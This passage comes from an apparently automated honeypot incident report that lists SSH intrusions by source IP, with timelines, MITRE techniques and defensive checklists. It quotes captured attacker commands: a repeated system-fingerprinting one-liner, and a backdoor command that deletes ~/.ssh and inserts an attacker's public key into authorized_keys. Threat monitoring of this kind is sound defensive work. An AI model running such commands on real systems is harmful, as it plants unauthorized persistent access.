| `2026-09-04 04:59:40` | `cowrie.command.input` |
| `2026-09-04 04:59:40` | `cowrie.command.success` |
| `2026-09-04 04:59:40` | `cowrie.command.input` |
| `2026-09-04 04:59:40` | `cowrie.command.input` |
| `2026-09-04 04:59:40` | `cowrie.command.input` |
| `2026-09-04 04:59:40` | `cowrie.command.input` |
| `2026-09-04 04:59:40` | `cowrie.log.closed` |
| `2026-09-04 04:59:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e70dcfb45b4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 05:02 |
| **Last Seen** | 2026-09-04 05:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 05:02:32` | `cowrie.session.connect` |
| `2026-09-04 05:02:32` | `cowrie.client.version` |
| `2026-09-04 05:02:33` | `cowrie.client.kex` |
| `2026-09-04 05:02:33` | `cowrie.login.success` |
| `2026-09-04 05:02:34` | `cowrie.session.params` |
| `2026-09-04 05:02:34` | `cowrie.command.input` |
| `2026-09-04 05:02:34` | `cowrie.command.input` |
| `2026-09-04 05:02:34` | `cowrie.command.input` |
| `2026-09-04 05:02:34` | `cowrie.command.input` |
| `2026-09-04 05:02:34` | `cowrie.command.input` |
| `2026-09-04 05:02:34` | `cowrie.command.success` |
| `2026-09-04 05:02:34` | `cowrie.command.input` |
| `2026-09-04 05:02:34` | `cowrie.command.input` |
| `2026-09-04 05:02:34` | `cowrie.command.input` |
| `2026-09-04 05:02:34` | `cowrie.command.input` |
| `2026-09-04 05:02:34` | `cowrie.log.closed` |
| `2026-09-04 05:02:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a94a7e80bab1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 05:02 |
| **Last Seen** | 2026-09-04 05:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 05:02:45` | `cowrie.session.connect` |
| `2026-09-04 05:02:45` | `cowrie.client.version` |
| `2026-09-04 05:02:45` | `cowrie.client.kex` |
| `2026-09-04 05:02:46` | `cowrie.login.success` |
| `2026-09-04 05:02:46` | `cowrie.direct-tcpip.request` |
| `2026-09-04 05:02:46` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 05:02:46` | `cowrie.direct-tcpip.data` |
| `2026-09-04 05:02:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bba75fe00fe

| Field | Detail |
|---|---|
| **Source IP** | `4.240.96[.]30` |
| **First Seen** | 2026-09-04 05:03 |
| **Last Seen** | 2026-09-04 05:03 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 05:03:42` | `cowrie.session.connect` |
| `2026-09-04 05:03:42` | `cowrie.client.version` |
| `2026-09-04 05:03:42` | `cowrie.client.kex` |
| `2026-09-04 05:03:43` | `cowrie.login.success` |
| `2026-09-04 05:03:44` | `cowrie.session.params` |
| `2026-09-04 05:03:44` | `cowrie.command.input` |
| `2026-09-04 05:03:44` | `cowrie.command.failed` |
| `2026-09-04 05:03:45` | `cowrie.log.closed` |
| `2026-09-04 05:03:46` | `cowrie.session.params` |
| `2026-09-04 05:03:46` | `cowrie.command.input` |
| `2026-09-04 05:03:46` | `cowrie.session.file_download` |
| `2026-09-04 05:03:46` | `cowrie.log.closed` |
| `2026-09-04 05:03:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.240.96[.]30` to AbuseIPDB if not already reported
- [ ] Block `4.240.96[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-348b7a0acf2e

| Field | Detail |
|---|---|
| **Source IP** | `4.240.96[.]30` |
| **First Seen** | 2026-09-04 05:03 |
| **Last Seen** | 2026-09-04 05:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 05:03:46` | `cowrie.session.connect` |
| `2026-09-04 05:03:46` | `cowrie.client.version` |
| `2026-09-04 05:03:46` | `cowrie.client.kex` |
| `2026-09-04 05:03:48` | `cowrie.login.success` |
| `2026-09-04 05:03:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.240.96[.]30` to AbuseIPDB if not already reported
- [ ] Block `4.240.96[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e68930ecf52

| Field | Detail |
|---|---|
| **Source IP** | `4.240.96[.]30` |
| **First Seen** | 2026-09-04 05:03 |
| **Last Seen** | 2026-09-04 05:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 05:03:49` | `cowrie.session.connect` |
| `2026-09-04 05:03:49` | `cowrie.client.version` |
| `2026-09-04 05:03:49` | `cowrie.client.kex` |
| `2026-09-04 05:03:52` | `cowrie.login.success` |
| `2026-09-04 05:03:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.240.96[.]30` to AbuseIPDB if not already reported
- [ ] Block `4.240.96[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fefcc23ab5b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 05:05 |
| **Last Seen** | 2026-09-04 05:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 05:05:26` | `cowrie.session.connect` |
| `2026-09-04 05:05:27` | `cowrie.client.version` |
| `2026-09-04 05:05:27` | `cowrie.client.kex` |
| `2026-09-04 05:05:28` | `cowrie.login.success` |
| `2026-09-04 05:05:29` | `cowrie.session.params` |
| `2026-09-04 05:05:29` | `cowrie.command.input` |
| `2026-09-04 05:05:29` | `cowrie.command.input` |
| `2026-09-04 05:05:29` | `cowrie.command.input` |
| `2026-09-04 05:05:29` | `cowrie.command.input` |
| `2026-09-04 05:05:29` | `cowrie.command.input` |
| `2026-09-04 05:05:29` | `cowrie.command.success` |
| `2026-09-04 05:05:29` | `cowrie.command.input` |
| `2026-09-04 05:05:29` | `cowrie.command.input` |
| `2026-09-04 05:05:29` | `cowrie.command.input` |
| `2026-09-04 05:05:29` | `cowrie.command.input` |
| `2026-09-04 05:05:30` | `cowrie.log.closed` |
| `2026-09-04 05:05:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03a93aeaded4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 05:07 |
| **Last Seen** | 2026-09-04 05:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 05:07:33` | `cowrie.session.connect` |
| `2026-09-04 05:07:33` | `cowrie.client.version` |
| `2026-09-04 05:07:33` | `cowrie.client.kex` |
| `2026-09-04 05:07:35` | `cowrie.login.success` |
| `2026-09-04 05:07:36` | `cowrie.session.params` |
| `2026-09-04 05:07:36` | `cowrie.command.input` |
| `2026-09-04 05:07:36` | `cowrie.command.input` |
| `2026-09-04 05:07:36` | `cowrie.command.input` |
| `2026-09-04 05:07:36` | `cowrie.command.input` |
| `2026-09-04 05:07:36` | `cowrie.command.input` |
| `2026-09-04 05:07:36` | `cowrie.command.success` |
| `2026-09-04 05:07:36` | `cowrie.command.input` |
| `2026-09-04 05:07:36` | `cowrie.command.input` |
| `2026-09-04 05:07:36` | `cowrie.command.input` |
| `2026-09-04 05:07:36` | `cowrie.command.input` |
| `2026-09-04 05:07:37` | `cowrie.log.closed` |
| `2026-09-04 05:07:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d969a8d708a

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-04 05:08 |
| **Last Seen** | 2026-09-04 05:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 05:08:53` | `cowrie.session.connect` |
| `2026-09-04 05:08:53` | `cowrie.client.version` |
| `2026-09-04 05:08:53` | `cowrie.client.kex` |
| `2026-09-04 05:08:54` | `cowrie.login.success` |
| `2026-09-04 05:08:54` | `cowrie.direct-tcpip.request` |
| `2026-09-04 05:08:54` | `cowrie.direct-tcpip.data` |
| `2026-09-04 05:08:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b99b962e3a3a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 05:09 |
| **Last Seen** | 2026-09-04 05:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 05:09:35` | `cowrie.session.connect` |
| `2026-09-04 05:09:35` | `cowrie.client.version` |
| `2026-09-04 05:09:35` | `cowrie.client.kex` |
| `2026-09-04 05:09:37` | `cowrie.login.success` |
| `2026-09-04 05:09:38` | `cowrie.session.params` |
| `2026-09-04 05:09:38` | `cowrie.command.input` |
| `2026-09-04 05:09:38` | `cowrie.command.input` |
| `2026-09-04 05:09:38` | `cowrie.command.input` |
| `2026-09-04 05:09:38` | `cowrie.command.input` |
| `2026-09-04 05:09:38` | `cowrie.command.input` |
| `2026-09-04 05:09:38` | `cowrie.command.success` |
| `2026-09-04 05:09:38` | `cowrie.command.input` |
| `2026-09-04 05:09:38` | `cowrie.command.input` |
| `2026-09-04 05:09:38` | `cowrie.command.input` |
| `2026-09-04 05:09:38` | `cowrie.command.input` |
| `2026-09-04 05:09:39` | `cowrie.log.closed` |
| `2026-09-04 05:09:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-709952df9876

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 05:11 |
| **Last Seen** | 2026-09-04 05:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 05:11:43` | `cowrie.session.connect` |
| `2026-09-04 05:11:43` | `cowrie.client.version` |
| `2026-09-04 05:11:43` | `cowrie.client.kex` |
| `2026-09-04 05:11:44` | `cowrie.login.success` |
| `2026-09-04 05:11:45` | `cowrie.session.params` |
| `2026-09-04 05:11:45` | `cowrie.command.input` |
| `2026-09-04 05:11:45` | `cowrie.command.input` |
| `2026-09-04 05:11:45` | `cowrie.command.input` |
| `2026-09-04 05:11:45` | `cowrie.command.input` |
| `2026-09-04 05:11:45` | `cowrie.command.input` |
| `2026-09-04 05:11:45` | `cowrie.command.success` |
| `2026-09-04 05:11:45` | `cowrie.command.input` |
| `2026-09-04 05:11:45` | `cowrie.command.input` |
| `2026-09-04 05:11:45` | `cowrie.command.input` |
| `2026-09-04 05:11:45` | `cowrie.command.input` |
| `2026-09-04 05:11:46` | `cowrie.log.closed` |
| `2026-09-04 05:11:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1abb11b811d1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 05:13 |
| **Last Seen** | 2026-09-04 05:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 05:13:42` | `cowrie.session.connect` |
| `2026-09-04 05:13:42` | `cowrie.client.version` |
| `2026-09-04 05:13:42` | `cowrie.client.kex` |
| `2026-09-04 05:13:43` | `cowrie.login.success` |
| `2026-09-04 05:13:43` | `cowrie.direct-tcpip.request` |
| `2026-09-04 05:13:43` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 05:13:43` | `cowrie.direct-tcpip.data` |
| `2026-09-04 05:13:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62d436091326

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 05:13 |
| **Last Seen** | 2026-09-04 05:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 05:13:44` | `cowrie.session.connect` |
| `2026-09-04 05:13:45` | `cowrie.client.version` |
| `2026-09-04 05:13:45` | `cowrie.client.kex` |
| `2026-09-04 05:13:46` | `cowrie.login.success` |
| `2026-09-04 05:13:48` | `cowrie.session.params` |
| `2026-09-04 05:13:48` | `cowrie.command.input` |
| `2026-09-04 05:13:48` | `cowrie.command.input` |
| `2026-09-04 05:13:48` | `cowrie.command.input` |
| `2026-09-04 05:13:48` | `cowrie.command.input` |
| `2026-09-04 05:13:48` | `cowrie.command.input` |
| `2026-09-04 05:13:48` | `cowrie.command.success` |
| `2026-09-04 05:13:48` | `cowrie.command.input` |
| `2026-09-04 05:13:48` | `cowrie.command.input` |
| `2026-09-04 05:13:48` | `cowrie.command.input` |
| `2026-09-04 05:13:48` | `cowrie.command.input` |
| `2026-09-04 05:13:49` | `cowrie.log.closed` |
| `2026-09-04 05:13:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28aa8e7095ea

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 05:15 |
| **Last Seen** | 2026-09-04 05:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 05:15:44` | `cowrie.session.connect` |
| `2026-09-04 05:15:44` | `cowrie.client.version` |
| `2026-09-04 05:15:44` | `cowrie.client.kex` |
| `2026-09-04 05:15:46` | `cowrie.login.success` |
| `2026-09-04 05:15:48` | `cowrie.session.params` |
| `2026-09-04 05:15:48` | `cowrie.command.input` |
| `2026-09-04 05:15:48` | `cowrie.command.input` |
| `2026-09-04 05:15:48` | `cowrie.command.input` |
| `2026-09-04 05:15:48` | `cowrie.command.input` |
| `2026-09-04 05:15:48` | `cowrie.command.input` |
| `2026-09-04 05:15:48` | `cowrie.command.success` |
| `2026-09-04 05:15:48` | `cowrie.command.input` |
| `2026-09-04 05:15:48` | `cowrie.command.input` |
| `2026-09-04 05:15:48` | `cowrie.command.input` |
| `2026-09-04 05:15:48` | `cowrie.command.input` |
| `2026-09-04 05:15:48` | `cowrie.log.closed` |
| `2026-09-04 05:15:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4caa04dcb76

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 05:17 |
| **Last Seen** | 2026-09-04 05:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 05:17:43` | `cowrie.session.connect` |
| `2026-09-04 05:17:43` | `cowrie.client.version` |
| `2026-09-04 05:17:43` | `cowrie.client.kex` |
| `2026-09-04 05:17:44` | `cowrie.login.success` |
| `2026-09-04 05:17:45` | `cowrie.session.params` |
| `2026-09-04 05:17:45` | `cowrie.command.input` |
| `2026-09-04 05:17:45` | `cowrie.command.input` |
| `2026-09-04 05:17:45` | `cowrie.command.input` |
| `2026-09-04 05:17:45` | `cowrie.command.input` |
| `2026-09-04 05:17:45` | `cowrie.command.input` |
| `2026-09-04 05:17:45` | `cowrie.command.success` |
| `2026-09-04 05:17:45` | `cowrie.command.input` |
| `2026-09-04 05:17:45` | `cowrie.command.input` |
| `2026-09-04 05:17:45` | `cowrie.command.input` |
| `2026-09-04 05:17:45` | `cowrie.command.input` |
| `2026-09-04 05:17:46` | `cowrie.log.closed` |
| `2026-09-04 05:17:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba953c3b9f2e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 05:19 |
| **Last Seen** | 2026-09-04 05:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
